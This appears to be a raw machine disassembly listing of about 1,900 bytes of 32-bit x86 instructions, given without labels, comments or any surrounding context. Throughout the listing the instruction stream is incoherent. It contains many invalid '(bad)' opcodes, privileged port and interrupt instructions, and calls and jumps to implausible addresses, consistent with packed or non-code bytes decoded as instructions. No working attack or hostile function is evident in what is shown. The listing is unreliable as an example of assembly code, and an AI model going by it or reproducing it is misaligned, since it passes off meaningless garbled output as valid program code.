  427ebf:	add    ah,ch
  427ec1:	rol    DWORD PTR [ebx-0x3595fb0d],1
  427ec7:	pop    ecx
  427ec8:	or     eax,ebx
  427eca:	cli    
  427ecb:	add    BYTE PTR [ecx-0x4e728d1e],dh
  427ed1:	lea    ebp,[ebx]
  427ed3:	mov    edx,DWORD PTR [edx-0x4]
  427ed6:	dec    ecx
  427ed7:	inc    ebp
  427ed8:	shr    BYTE PTR [ebx],0x4b
  427edb:	and    al,0x0
  427edd:	(bad)  
  427ede:	jne    0x427f25
  427ee0:	pop    eax
  427ee1:	mov    al,0x5a
  427ee3:	call   0x1418142
  427ee8:	and    al,0x85
  427eea:	push   edx
  427eeb:	add    BYTE PTR [eax+eax*1+0x0],ah
  427eef:	dec    ebp
  427ef0:	mov    cl,0x23
  427ef2:	jmp    0x427ee0
  427ef4:	mov    al,0xe7
  427ef6:	call   0x13881e4
  427efb:	shr    DWORD PTR [eax+ebx*2],cl
  427efe:	lock (bad) 
  427f00:	adc    eax,0x757f008d
  427f05:	out    0x58,eax
  427f07:	cmp    al,0x7
  427f09:	pop    edx
  427f0a:	or     DWORD PTR [edx+eax*1-0x74fff494],ecx
  427f11:	push   ecx
  427f12:	cld    
  427f13:	mov    esi,0x3b0175
  427f18:	and    al,0xb0
  427f1a:	xor    BYTE PTR [edx+0x1],0x8b
  427f1e:	add    ah,bh
  427f20:	mov    edi,DWORD PTR [ebp-0x4]
  427f23:	psubsw mm7,QWORD PTR [edi]
  427f26:	add    DWORD PTR [ebp+0x0],ebp
  427f29:	rcr    eax,1
  427f2b:	mov    edi,ecx
  427f2d:	and    eax,DWORD PTR [eax]
  427f2f:	add    ecx,DWORD PTR [ebx+0x1b4dd88d]
  427f35:	call   0x12f821e
  427f3a:	add    al,cl
  427f3c:	mov    ebp,esi
  427f3e:	aam    0x83
  427f40:	or     DWORD PTR [ecx],eax
  427f42:	jne    0x427f35
  427f44:	mov    eax,DWORD PTR [eax]
  427f46:	aam    0x0
  427f48:	dec    ebp
  427f49:	jne    0x427ed6
  427f4b:	cmp    ebx,eax
  427f4d:	jb     0x427f9c
  427f4f:	jmp    0x427edc
  427f51:	mov    ebx,esp
  427f53:	int3   
  427f54:	dec    ebp
  427f55:	or     DWORD PTR [ecx+0x5f8bdc00],0xffffff8b
  427f5c:	mov    edx,0x8b0a8b
  427f61:	cmp    ecx,DWORD PTR [eax]
  427f63:	jb     0x427f3c
  427f65:	pop    edx
  427f66:	push   edi
  427f67:	cli    
  427f68:	pop    es
  427f69:	mov    eax,ecx
  427f6b:	jb     0x427f6f
  427f6d:	add    DWORD PTR [ebx],0xa
  427f70:	mov    eax,DWORD PTR [ebx]
  427f72:	int3   
  427f73:	add    bh,BYTE PTR [esi+0x75d10006]
  427f79:	jmp    0x427f06
  427f7b:	mov    al,0xe8
  427f7d:	call   0x10381ff
  427f82:	add    edx,DWORD PTR [ecx+ecx*8]
  427f85:	pop    edi
  427f86:	or     BYTE PTR [ecx-0x73],bl
  427f89:	pop    ecx
  427f8a:	inc    edi
  427f8b:	xor    al,0xeb
  427f8d:	push   ecx
  427f8e:	mov    edi,DWORD PTR [edx+0xc506cc]
  427f94:	call   0xb18099
  427f99:	int3   
  427f9a:	sbb    BYTE PTR [esi],ch
  427f9c:	inc    ebp
  427f9d:	add    BYTE PTR [ebx-0x1f4f338b],cl
  427fa3:	call   0x9b8212
  427fa8:	or     BYTE PTR [ebx-0x73],dl
  427fab:	cmp    al,0x47
  427fad:	mov    al,0x1
  427faf:	jb     0x427fb1
  427fb1:	mov    al,0x10
  427fb3:	push   eax
  427fb4:	add    al,0x75
  427fb6:	add    BYTE PTR [ebx],ch
  427fb8:	add    ebx,esp
  427fba:	int3   
  427fbb:	jne    0x427fcd
  427fbd:	movsx  edx,cl
  427fc0:	add    DWORD PTR [eax],eax
  427fc2:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  427fc9:	mov    gs,edi
  427fcb:	add    BYTE PTR [eax-0x50],ch
  427fce:	add    al,ch
  427fd0:	mov    eax,DWORD PTR [ecx]
  427fd2:	sub    eax,DWORD PTR [eax]
  427fd4:	jb     0x42804b
  427fd6:	add    DWORD PTR [esp+eiz*8-0x50],esi
  427fda:	jge    0x427fc4
  427fdc:	add    al,0x1
  427fde:	add    DWORD PTR [eax],0x0
  427fe1:	jne    0x427fe3
  427fe3:	je     0x42802a
  427fe5:	mov    eax,DWORD PTR [edi]
  427fe7:	ror    BYTE PTR [ebp+0x4d],1
  427fea:	or     DWORD PTR [ecx+0x4d03d004],0x3
  427ff1:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  427ff7:	mov    DWORD PTR [ebx],ebp
  427ff9:	fadd   DWORD PTR [eax+0x75]
  427ffc:	inc    eax
  427ffd:	pop    eax
  427ffe:	lea    ebx,[ecx+0x4f]
  428001:	push   0xb1000003
  428006:	out    dx,eax
  428007:	add    ebp,DWORD PTR [edx+edx*2]
  42800a:	add    BYTE PTR [ebx+ecx*4],bh
  42800d:	mov    ch,BYTE PTR [ebx]
  42800f:	jb     0x428083
  428011:	add    al,0x89
  428013:	push   eax
  428014:	call   0x842acd86
  428019:	add    DWORD PTR [eax+eax*1],eax
  42801c:	jae    0x428032
  42801e:	icebp  
  42801f:	inc    ebp
  428020:	mov    eax,DWORD PTR gs:[ecx]
  428023:	int3   
  428024:	out    dx,al
  428025:	loopne 0x428074
  428027:	sub    eax,DWORD PTR [edx]
  428029:	push   0xffffff83
  42802b:	pop    esi
  42802c:	push   cs
  42802d:	jl     0x428048
  42802f:	add    al,0xaf
  428031:	xor    eax,0x832b6d00
  428036:	mov    eax,DWORD PTR [edx]
  428038:	rcr    BYTE PTR [ebp+0x754500dc],cl
  42803e:	ror    DWORD PTR [ebx+0x7dc8e803],1
  428044:	inc    ebp
  428045:	shr    ebx,0x3
  428048:	or     DWORD PTR [eax],0x4
  42804b:	push   0xffffffa5
  42804d:	pop    esi
  42804e:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  428055:	jmp    0x4280b4
  428057:	mov    edi,0xff0272
  42805c:	fdivr  QWORD PTR [ebp+0x5d]
  42805f:	push   0x4e
  428061:	pop    ecx
  428062:	call   0x42c467
  428067:	mov    DWORD PTR [ebx],eax
  428069:	in     al,0xc8
  42806b:	rol    BYTE PTR [ebp-0x75],0xc1
  42806f:	call   0xac8250
  428074:	pop    esi
  428075:	enter  0xceff,0x8b
  428079:	repz mov ecx,DWORD PTR [ebp-0x34]
  42807d:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  428084:	je     0x428086
  428086:	or     DWORD PTR [ebx-0x74183b24],eax
  42808c:	jne    0x428072
  42808e:	jmp    0x428089
  428090:	push   DWORD PTR [edx-0x24]
  428093:	push   0x4d
  428095:	pop    ecx
  428096:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  42809a:	jge    0x4280a2
  42809c:	mov    eax,eax
  42809e:	sub    ebp,DWORD PTR [edx+0x24]
  4280a1:	pop    esi
  4280a2:	inc    ebp
  4280a3:	mov    esp,0x8b6077
  4280a8:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  4280ae:	lods   al,BYTE PTR ds:[esi]
  4280af:	add    BYTE PTR [ebx],bh
  4280b1:	enter  0xce73,0x49
  4280b5:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  4280bd:	stc    
  4280be:	jge    0x428132
  4280c0:	jnp    0xdd42042f
  4280c6:	call   0xc5819c
  4280cb:	fadd   st(0),st
  4280cd:	dec    esi
  4280ce:	ins    BYTE PTR es:[edi],dx
  4280cf:	stc    
  4280d0:	cmp    al,0x73
  4280d2:	push   ebp
  4280d3:	mov    eax,0xf8028b
  4280d8:	jne    0x42809b
  4280da:	mov    esi,ecx
  4280dc:	mov    esp,DWORD PTR [ebp+0x2c]
  4280df:	add    edi,DWORD PTR [ebp-0x24]
  4280e2:	sub    esp,eax
  4280e4:	and    al,0x45
  4280e6:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  4280ec:	sbb    al,0xee
  4280ee:	pop    esi
  4280ef:	call   0x82811f
  4280f4:	fsubr  st,st(3)
  4280f6:	sti    
  4280f7:	add    BYTE PTR gs:[ecx],bh
  4280fa:	add    eax,esp
  4280fc:	add    DWORD PTR [esi],eax
  4280fe:	rol    DWORD PTR [ebp+0x8],0x29
  428102:	mov    esp,eax
  428104:	clc    
  428105:	jne    0x42817c
  428107:	mov    eax,0x8b0673
  42810c:	loopne 0x428153
  42810e:	loopne 0x428099
  428110:	lods   al,BYTE PTR ds:[esi]
  428111:	int3   
  428112:	inc    ebp
  428113:	mov    DWORD PTR gs:[eax+edi*8],eax
  428117:	add    al,0xc3
  428119:	sub    ecx,DWORD PTR [ebp+0x47]
  42811c:	(bad)  
  42811e:	shr    BYTE PTR [ebp-0x1f],0xe8
  428122:	add    eax,DWORD PTR [eax]
  428124:	call   0x6444229
  428129:	add    esi,DWORD PTR [esi-0x3b2efc83]
  42812f:	dec    esi
  428130:	ins    DWORD PTR es:[edi],dx
  428131:	in     al,dx
  428132:	lea    eax,[eax]
  428134:	inc    ebp
  428135:	inc    ebp
  428136:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  42813c:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  428146:	and    al,0xdc
  428148:	ror    DWORD PTR [edx+0x24],0xf7
  42814c:	or     BYTE PTR [ebp+0x4c],dh
  42814f:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  428153:	stos   BYTE PTR es:[edi],al
  428154:	adc    edx,edi
  428156:	inc    esp
  428157:	add    edi,DWORD PTR [eax]
  428159:	jne    0x42813e
  42815b:	mov    DWORD PTR [eax-0x7449db04],ecx
  428161:	cmp    ecx,DWORD PTR [edi]
  428163:	sub    BYTE PTR [ebp-0x7e],dl
  428166:	sar    ebp,0xb
  428169:	jmp    FWORD PTR [edi+0x2400392a]
  42816f:	sub    esi,DWORD PTR [ebx-0x73]
  428172:	mov    esp,DWORD PTR [ecx+edi*4]
  428175:	mov    ecx,DWORD PTR [eax]
  428177:	and    BYTE PTR [eax],al
  428179:	jne    0x428145
  42817b:	sub    ebp,ecx
  42817d:	sbb    BYTE PTR [esi+0x32],ah
  428180:	dec    ebp
  428181:	push   ebp
  428182:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  428188:	ret    
  428189:	mov    edx,ebp
  42818b:	leave  
  42818c:	sub    DWORD PTR [esi+0x24],ebx
  42818f:	ret    0x2b
  428192:	pop    ax
  428194:	push   ebp
  428195:	rol    BYTE PTR [ebx],0xeb
  428198:	add    DWORD PTR [ecx+0x6c0001],0x40
  42819f:	jb     0x4281f6
  4281a1:	ret    
  4281a2:	in     al,dx
  4281a3:	jecxz  0x428130
  4281a5:	push   esi
  4281a6:	xchg   esp,eax
  4281a7:	jne    0x4281a9
  4281a9:	cmp    edx,DWORD PTR [esi+0x1c]
  4281ac:	jne    0x428192
  4281ae:	mov    eax,DWORD PTR [ebp-0x77]
  4281b1:	ror    DWORD PTR [ebx+0x899408],0xe0
  4281b8:	mov    esi,DWORD PTR [ebp-0x75]
  4281bb:	pop    esi
  4281bc:	nop
  4281bd:	mov    eax,DWORD PTR [eax]
  4281bf:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  4281c5:	add    al,0x0
  4281c7:	inc    ebp
  4281c8:	mov    eax,DWORD PTR [ebx]
  4281ca:	mov    ebp,ebx
  4281cc:	cmp    al,0xf
  4281ce:	or     al,al
  4281d0:	inc    ebp
  4281d1:	inc    ebp
  4281d2:	cmp    BYTE PTR [ebx+0x6c8bc89c],cl
  4281d8:	cld    
  4281d9:	add    BYTE PTR [edi+0x506c16c0],dh
  4281df:	add    BYTE PTR [ecx-0x5],dl
  4281e2:	add    eax,0x17200
  4281e7:	sbb    al,0x85
  4281e9:	dec    esp
  4281ea:	je     0x428224
  4281ec:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  4281f0:	add    BYTE PTR [ebx],bh
  4281f2:	(bad)  
  4281f3:	and    al,0x39
  4281f5:	jae    0x428193
  4281f7:	mov    cl,cl
  4281f9:	inc    DWORD PTR [esp]
  4281fc:	push   ebp
  4281fd:	shr    esp,0x8
  428200:	in     al,dx
  428201:	push   esp
  428202:	add    DWORD PTR [eax],esp
  428204:	add    bl,cl
  428206:	inc    ebp
  428207:	mov    bh,0x89
  428209:	add    ah,bh
  42820b:	jmp    0xca7b9155
  428210:	pushf  
  428211:	dec    esp
  428212:	mov    edx,0xf8178520
  428217:	fst    DWORD PTR [ebp+0x0]
  42821a:	mov    BYTE PTR [eax],0xc4
  42821d:	sub    edx,DWORD PTR [ebx-0x3f]
  428220:	inc    ebp
  428221:	add    eax,0xc601dc
  428226:	mov    al,0xc6
  428229:	ins    BYTE PTR es:[edi],dx
  42822a:	mov    DWORD PTR [eax+0x57],0x2e0545c1
  428231:	dec    esp
  428232:	jmp    DWORD PTR [eax]
  428234:	inc    ebp
  428235:	fnstcw WORD PTR [eax+0x29]
  428238:	test   BYTE PTR [eax],0xc5
  42823b:	rol    BYTE PTR [eax],0xc0
  42823e:	lea    ecx,[ebp-0x3cf0dbcb]
  428244:	sbb    BYTE PTR [ebx-0x75fcae0d],cl
  42824a:	inc    esi
  42824b:	add    DWORD PTR [eax],ebx
  42824d:	add    dh,bh
  42824f:	mov    esi,DWORD PTR [edx+0x8]
  428252:	(bad)  
  428253:	fdiv   QWORD PTR ss:[ecx]
  428256:	(bad)  
  428257:	mov    bl,ch
  428259:	add    esi,eax
  42825b:	add    dh,bl
  42825d:	or     esi,eax
  42825f:	mov    dl,0xdf
  428261:	add    esi,eax
  428263:	add    al,ah
  428265:	push   cs
  428266:	mov    BYTE PTR [edx+0xc601e1],0xe2
  42826d:	or     BYTE PTR [ebx],dh
  42826f:	dec    ecx
  428270:	lea    eax,[ebx]
  428272:	xor    eax,0x18fc0fc7
  428277:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428278:	repz clc 
  42827a:	add    eax,DWORD PTR [ebp+0x46]
  42827d:	prefetcht0 BYTE PTR [ecx-0x2]
  428281:	xor    eax,0x7c60872
  428286:	mov    esp,0xbd32c698
  42828b:	pop    esi
  42828c:	mov    cl,0xbe
  42828f:	or     al,0xc6
  428291:	cmp    BYTE PTR [edi-0x3fff39ff],0x0
  428298:	mov    BYTE PTR [ebp-0x3d39073f],0xc2
  42829f:	add    dh,al
  4282a1:	mov    eax,ebx
  4282a3:	xor    DWORD PTR [ebx],0x35008dbc
  4282a9:	mov    ecx,DWORD PTR [edi]
  4282ab:	sbb    al,0x18
  4282ad:	inc    ebp
  4282ae:	xrelease mov DWORD PTR [ebx],0x188546f4
  4282b5:	clc    
  4282b6:	(bad)  
  4282b7:	cmp    BYTE PTR [edx-0x64],dh
  4282ba:	lea    ecx,[ecx+0x45ffe838]
  4282c0:	mov    ecx,esp
  4282c2:	fadd   st,st(6)
  4282c4:	dec    ebp
  4282c5:	lds    edi,FWORD PTR [eax+0x7145fc56]
  4282cb:	out    0x1,eax
  4282cd:	inc    ebp
  4282ce:	lea    ebp,ds:0xc8ffc6ff
  4282d4:	enter  0xa33,0xc6
  4282d8:	push   ebp
  4282d9:	leave  
  4282da:	(bad)  
  4282db:	xor    edi,DWORD PTR [eax-0x7ff7a47]
  4282e1:	add    BYTE PTR [ebp+0x44],al
  4282e4:	mov    eax,esp
  4282e6:	mov    WORD PTR [esi+0x43398300],?
  4282ec:	psubusw mm4,QWORD PTR [eax-0x78]
  4282f0:	add    BYTE PTR [ebx-0x1303f975],al
  4282f6:	add    BYTE PTR [ebp+0x1],0xf3
  4282fa:	add    BYTE PTR [ebp+0x38],al
  4282fd:	in     eax,dx
  4282fe:	inc    ebp
  4282ff:	inc    ebp
  428300:	mov    esp,ebx
  428302:	add    BYTE PTR [ebp+0x0],0xee
  428306:	mov    DWORD PTR [ebp-0x48],eax
  428309:	sub    eax,0x2e00454f
  42830e:	js     0x428355
  428310:	data16 js 0x428298
  428313:	idiv   bh
  428315:	inc    esp
  428316:	(bad)  
  428317:	fadd   st(7),st
  428319:	mov    dh,0x89
  42831b:	and    DWORD PTR [esi+0x43],0xffffffff
  42831f:	fld    DWORD PTR [ebx-0x767cc078]
  428325:	pop    es
  428326:	push   0x8d45ffec
  42832b:	in     eax,dx
  42832c:	inc    DWORD PTR [ebp-0x77]
  42832f:	loopne 0x42839b
  428331:	inc    ebp
  428332:	jmp    esp
  428334:	add    DWORD PTR [ebp+0x11],0xfffffff1
  428338:	mov    DWORD PTR [ebp+0x6c],eax
  42833b:	(bad)  
  42833d:	inc    ebp
  42833e:	(bad)  
  42833f:	call   0xe7cbc850
  428344:	outs   dx,BYTE PTR ds:[esi]
  428345:	inc    ebp
  428346:	(bad)  
  428347:	js     0x4282cc
  428349:	div    BYTE PTR ds:0x70bc8944
  42834f:	mov    dh,0xff
  428351:	or     DWORD PTR [ebp-0x7626f5bd],0xffffff88
  428358:	jb     0x4282dd
  42835a:	dec    DWORD PTR [eax]
  42835c:	mov    ebp,esp
  42835e:	test   WORD PTR [ebp-0x1],ax
  428365:	inc    ebp
  428366:	ror    BYTE PTR [ebx-0x117a279a],0xff
  42836d:	adc    edi,edi
  42836f:	mov    ecx,esi
  428371:	mov    eax,DWORD PTR [eax]
  428373:	cmp    BYTE PTR [esi-0x1],ah
  428376:	test   DWORD PTR [ebx],edi
  428378:	push   DWORD PTR [ebp-0x1]
  42837b:	mov    DWORD PTR [esi-0x48],ebp
  42837e:	add    BYTE PTR [ebp+0x66],al
  428381:	jmp    0x428308
  428383:	pushf  
  428384:	dec    DWORD PTR [ebx-0x7f9c0301]
  42838a:	add    BYTE PTR [ecx],al
  42838c:	data16 add BYTE PTR [ebp-0x7a00c8],al
  428393:	add    al,al
  428395:	add    BYTE PTR [esi+0x45],ah
  428398:	test   DWORD PTR [ebx+0xff7cff],ecx
  42839e:	dec    esp
  42839f:	mov    DWORD PTR [eax],eax
  4283a1:	mov    esp,DWORD PTR [esi-0x4]
  4283a4:	inc    ebp
  4283a5:	cmp    BYTE PTR [eax+0x4701],0x38
  4283ac:	mov    DWORD PTR [ecx-0x7e],esp
  4283af:	add    BYTE PTR [edi-0x73],al
  4283b2:	push   0xffffffd1
  4283b4:	mov    WORD PTR [ebp+0x64],ax
  4283b8:	(bad)  
  4283b9:	call   eax
  4283bb:	mov    esp,eax
  4283bd:	data16 icebp 
  4283bf:	test   DWORD PTR [ebp-0x1],eax
  4283c2:	(bad)  
  4283c4:	out    0xc0,eax
  4283c6:	lea    esp,[esi-0x30]
  4283c9:	test   DWORD PTR [edx+0x43ff80ff],ecx
  4283cf:	inc    edi
  4283d0:	jmp    0x75ff:0x40858866
  4283d7:	dec    DWORD PTR [ebp-0x7a992f40]
  4283dd:	test   esi,edi
  4283df:	(bad)  
  4283e0:	(bad)  
  4283e1:	inc    DWORD PTR [ebp-0x9901b9]
  4283e7:	test   DWORD PTR [ebx+0x50fff4ff],ecx
  4283ed:	rcl    BYTE PTR [ecx+0x66],0x33
  4283f1:	test   DWORD PTR [ebx+0xff72ff],edi
  4283f7:	inc    edi
  4283f8:	ret    
  4283f9:	mov    ax,WORD PTR [ebp-0x3f0004]
  428400:	push   eax
  428401:	mov    DWORD PTR [ebp-0x77],0xff98748b
  428408:	add    BYTE PTR [ebx-0x764ff439],al
  42840e:	push   DWORD PTR [esi+0x1]
  428411:	inc    DWORD PTR [eax]
  428413:	mov    eax,0xff99ff
  428418:	or     BYTE PTR [ecx-0x7a87bb],cl
  42841e:	jne    0x4283d8
  428420:	add    DWORD PTR [edx-0x76edff72],0xff707a8d
  42842a:	mov    ecx,0xd74fb8
  42842f:	add    cl,al
  428431:	mov    DWORD PTR [ecx-0x3f007784],ecx
  428437:	or     DWORD PTR [ebx+0x558966ec],0x7e
  42843e:	(bad)  
  42843f:	push   ebp
  428441:	mov    eax,0x8c2789
  428446:	ret    0x6689
  428449:	adc    BYTE PTR [ebp+0x4c],0x8d
  42844d:	add    bl,bl
  42844f:	mov    WORD PTR [ebp-0x70],ax
  428453:	(bad)  
  428454:	ret    0x660d
  428457:	or     BYTE PTR [ebp-0x77],dl
  42845a:	lea    eax,[ecx+eiz*8-0x6b1276bb]
  428461:	in     al,0x89
  428463:	(bad)  
  428464:	xchg   esi,eax
  428465:	aam    0xcf
  428467:	call   0x45dafcf5
  42846c:	dec    edx
  42846d:	pop    ecx
  42846e:	mov    edx,DWORD PTR [eax]
  428470:	repnz push bp
  428473:	or     BYTE PTR [ebx+0x5510663b],0x49
  42847a:	(bad)  
  42847b:	repnz xor eax,0xa0898945
  428481:	mov    ah,0x89
  428483:	jmp    DWORD PTR [edx+0x66b0418d]
  428489:	inc    DWORD PTR [ebp+0x50]
  42848c:	add    DWORD PTR [ebp-0x5],0xffffffbe
  428490:	mov    DWORD PTR [eax],ecx
  428492:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428493:	pop    es
  428494:	inc    ecx
  428495:	(bad)  
  428496:	cbw    
  428498:	inc    ebp
  428499:	xor    ah,BYTE PTR [esi+0x3]
  42849c:	dec    ebp
  42849d:	push   eax
  42849e:	inc    bp
  4284a0:	jge    0x428425
  4284a2:	mov    esp,DWORD PTR [esi-0x18]
  4284a5:	mov    esi,DWORD PTR [edi+0x7d809cfc]
  4284ab:	add    DWORD PTR [ebx],esi
  4284ad:	add    BYTE PTR [ebx],al
  4284af:	test   DWORD PTR [ebx],esi
  4284b1:	(bad)  
  4284b2:	inc    WORD PTR [ebp+0x0]
  4284b6:	mov    eax,DWORD PTR [eax]
  4284b8:	call   0x88983bed
  4284bd:	mov    esi,eax
  4284bf:	clc    
  4284c0:	ret    
  4284c1:	rol    cl,0xa
  4284c4:	mov    DWORD PTR ds:0x7c0ec88,esi
  4284ca:	mov    edx,edi
  4284cc:	pushf  
  4284cd:	pop    es
  4284ce:	jmp    FWORD PTR [edx+0x66]
  4284d1:	add    BYTE PTR [ebp-0x990175],al
  4284d7:	inc    ebp
  4284d8:	test   DWORD PTR [ebx-0x2f000202],eax
  4284de:	push   ebp
  4284df:	mov    edi,eax
  4284e1:	mov    dh,BYTE PTR [eax+0x266ff51]
  4284e7:	push   ebp
  4284e8:	add    BYTE PTR [ebx-0x764b1777],al
  4284ee:	dec    DWORD PTR [esi+0x661851e8]
  4284f4:	add    BYTE PTR [ebp-0x7b],dl
  4284f7:	cmp    esi,0xfffffffb
  4284fa:	dec    DWORD PTR [ecx+0x51fe9285]
  428500:	jmp    DWORD PTR [esi-0x75]
  428503:	push   ebp
  428504:	hlt    
  428505:	data16 (bad) 
  428507:	dec    ebp
  428508:	ret    
  428509:	mov    ecx,DWORD PTR [ebp-0xb29b9a]
  42850f:	lea    edx,[eax-0x1]
  428512:	jne    0x4284e5
  428514:	dec    DWORD PTR [ecx-0x2f7a63f8]
  42851a:	dec    BYTE PTR [ecx+0x51559eff]
  428520:	mov    DWORD PTR [esi-0x4c],esp
  428523:	push   ebp
  428524:	jmp    DWORD PTR [esi-0x18]
  428527:	inc    ebp
  428528:	sbb    BYTE PTR [ebp-0x767ae500],cl
  42852e:	(bad)  
  42852f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428530:	inc    eax
  428532:	test   DWORD PTR [esi-0x2],esp
  428535:	inc    ebp
  428536:	dec    DWORD PTR [ebp-0x760bde75]
  42853c:	(bad)  
  42853d:	test   al,0xc3
  42853f:	mov    DWORD PTR [ebp-0x769b56],ecx
  428545:	lods   al,BYTE PTR ds:[esi]
  428546:	push   eax
  428547:	inc    ebp
  428548:	jne    0x428559
  42854a:	dec    DWORD PTR [ebp+0x8]
  42854d:	mov    eax,DWORD PTR [edi]
  42854f:	sbb    al,0x0
  428551:	(bad)  
  428552:	mov    eax,0xc14fc3
  428557:	mov    DWORD PTR [eax-0x64],edi
  42855a:	inc    bp
  42855c:	test   DWORD PTR [edi],ecx
  42855e:	dec    DWORD PTR [ebp-0x1]
  428561:	xor    eax,edi
  428563:	add    ecx,DWORD PTR [ecx-0x99bdcd]
  428569:	inc    ebp
  42856a:	xor    DWORD PTR [ebx],0x3f
  42856d:	mov    WORD PTR [ebp-0x1bc],ax
  428574:	lea    ecx,[ecx-0x767702]
  42857a:	inc    esi
  42857b:	(bad)  
  42857c:	call   FWORD PTR [ebp+ecx*4-0x3e72be01]
  428583:	pushf  
  428584:	rol    DWORD PTR [ebp-0x72019a],0xff
  42858b:	add    bh,bh
  42858d:	add    BYTE PTR [edi],cl
  42858f:	test   DWORD PTR [eax],eax
  428591:	(bad)  
  428592:	dec    WORD PTR [ebp-0xff002d]
  428599:	mov    DWORD PTR [eax+edi*4+0x0],edi
  42859d:	jmp    DWORD PTR [esi-0x73]
  4285a0:	lea    esi,[eax+0x50ffffff]
  4285a6:	fadd   QWORD PTR [ebp+0x0]
  4285a9:	xor    esp,DWORD PTR [esi+0x3]
  4285ac:	lea    edx,[eax-0x1]
  4285af:	test   edi,edi
  4285b1:	dec    DWORD PTR [ebp-0x1]
  4285b4:	mov    edi,edi
  4285b6:	dec    eax
  4285b7:	clc    
  4285b8:	call   DWORD PTR [ebp-0x73]
  4285bb:	lea    esi,[eax+0x51ffff88]
  4285c1:	lea    ecx,[ebp-0x78]
  4285c4:	test   WORD PTR [ebp-0x2],ax
  4285cb:	popf   
  4285cc:	push   eax
  4285cd:	add    BYTE PTR [ecx-0x77],dl
  4285d0:	xor    edi,DWORD PTR [eax-0x7236007d]
  4285d6:	cwde   
  4285d7:	mov    al,0x32
  4285d9:	inc    DWORD PTR [ebx]
  4285db:	push   eax
  4285dc:	push   ecx
  4285dd:	inc    ebp
  4285de:	shl    BYTE PTR [ebx],1
  4285e0:	lea    eax,[ebx]
  4285e2:	call   DWORD PTR [eax-0x1]
  4285e5:	test   DWORD PTR [ebx],esi
  4285e7:	inc    DWORD PTR [eax-0x1]
  4285ea:	(bad)  
  4285eb:	(bad)  
  4285ec:	(bad)  
  4285ed:	clc    
  4285ee:	call   DWORD PTR [ebp+0x50]
  4285f1:	jmp    0xcb876b
  4285f6:	inc    esp
  4285f7:	jnp    0x4285f8
  4285f9:	add    BYTE PTR [ecx-0x484f73],cl
  4285ff:	mov    DWORD PTR [ebx-0x7f0003c0],ecx
  428605:	mov    eax,DWORD PTR [ecx]
  428607:	data16 add BYTE PTR [ebp-0xb50077],al
  42860e:	inc    eax
  428610:	lea    esp,[esi+0x14]
  428613:	test   DWORD PTR [ecx-0xb301],ecx
  428619:	inc    edi
  42861a:	(bad)  
  42861b:	dec    si
  42861d:	test   edi,edi
  42861f:	(bad)  
  428620:	cmp    eax,0xc74f73ff
  428625:	mov    edx,DWORD PTR [edx-0x7d]
  428628:	push   DWORD PTR [ebx+0x56328939]
  42862e:	(bad)  
  42862f:	call   FWORD PTR [esi-0x47]
  428632:	inc    DWORD PTR ds:0x893c00ea
  428638:	(bad)  
  428639:	pop    eax
  42863a:	mov    ah,0xff
  42863c:	(bad)  
  42863d:	mov    ecx,0x5745
  428642:	dec    DWORD PTR [ecx-0xf7a501]
  428648:	(bad)  
  428649:	mov    ecx,0x456108
  42864e:	mov    ecx,DWORD PTR [ecx-0x3fa3e4]
  428654:	test   BYTE PTR [ebp-0x72ff23fd],cl
  42865a:	inc    BYTE PTR gs:[eax]
  42865d:	inc    DWORD PTR [ebp-0x73]
  428660:	cmp    dh,bh
  428662:	pushf  
  428663:	inc    edi
  428665:	mov    ebx,eax
  428667:	hlt    
  428668:	test   DWORD PTR [ecx-0xbab708],ecx
  42866e:	cmp    al,0xbe
  428670:	pushf  
  428671:	or     bh,al
  428673:	pop    es
  428674:	lock into 
  428676:	test   eax,eax
  428678:	clc    
  428679:	mov    ebx,0x387245
  42867e:	lahf   
  42867f:	retf   
  428680:	mov    ecx,DWORD PTR [ebx+0x40808dfc]
  428686:	add    edi,edi
  428688:	add    BYTE PTR [ecx+0x45],dl
  42868b:	ror    BYTE PTR [ebx+0x4d44fc8d],0xff
  428692:	mov    edx,DWORD PTR [ecx-0x74]
  428695:	inc    DWORD PTR [eax]
  428697:	cld    
  428698:	mov    eax,DWORD PTR [ebp-0x6f0175]
  42869e:	add    BYTE PTR [ebp-0x1b0177],al
  4286a4:	jge    0x4286eb
  4286a6:	test   DWORD PTR [ebx+0xff9875],ecx
  4286ac:	sbb    BYTE PTR [esi+0x55],ah
  4286af:	xchg   ebp,eax
  4286b0:	call   0x4281b4
  4286b5:	push   edi
  4286b6:	inc    ebp
  4286b7:	mov    dx,WORD PTR [ebp-0xfc0075]
  4286be:	cmp    al,0x85
  4286c0:	ud0    eax,DWORD PTR [ebp-0x1]
  4286c4:	test   DWORD PTR [edi+0x74],ecx
  4286c7:	dec    edi
  4286c8:	inc    DWORD PTR [ebp-0xf70004]
  4286ce:	dec    DWORD PTR [edi-0x75]
  4286d1:	dec    edi
  4286d2:	cld    
  4286d3:	test   DWORD PTR [eax+0xff01ff],eax
  4286d9:	icebp  
  4286da:	add    BYTE PTR [edi-0x3a],cl
  4286dd:	test   ebx,eax
  4286df:	inc    BYTE PTR [ebp-0x1]
  4286e2:	jne    0x4286e4
  4286e4:	mov    eax,DWORD PTR [eax]
  4286e6:	cld    
  4286e7:	xor    BYTE PTR [ecx+0x500155],cl
  4286ed:	push   ebp
  4286ee:	xor    DWORD PTR [ecx+0x45011c80],ecx
  4286f4:	add    BYTE PTR [ebp+0x35e90f50],al
  4286fa:	add    al,BYTE PTR [eax]
  4286fc:	add    BYTE PTR [ebx-0x38fe4f80],al
  428702:	add    ah,ch
  428704:	or     BYTE PTR [ebp+0x4501f845],dh
  42870a:	jmp    0xde8a07
  42870f:	(bad)  
  428710:	nop    ecx
